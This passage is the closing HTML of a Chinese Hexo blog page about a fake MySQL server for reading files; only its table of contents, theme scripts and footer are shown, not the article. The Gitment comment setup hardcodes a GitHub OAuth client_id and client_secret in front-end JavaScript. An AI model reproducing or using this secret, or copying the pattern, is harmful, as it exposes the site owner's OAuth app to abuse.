+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#原理"><span class="toc-nav-text">原理</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#抓包分析"><span class="toc-nav-text">抓包分析</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#具体操作"><span class="toc-nav-text">具体操作</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#具体服务"><span class="toc-nav-text">具体服务</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#脚本"><span class="toc-nav-text">脚本</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/04/19/伪mysql服务器-getFile/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "伪mysql服务器_getFile",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
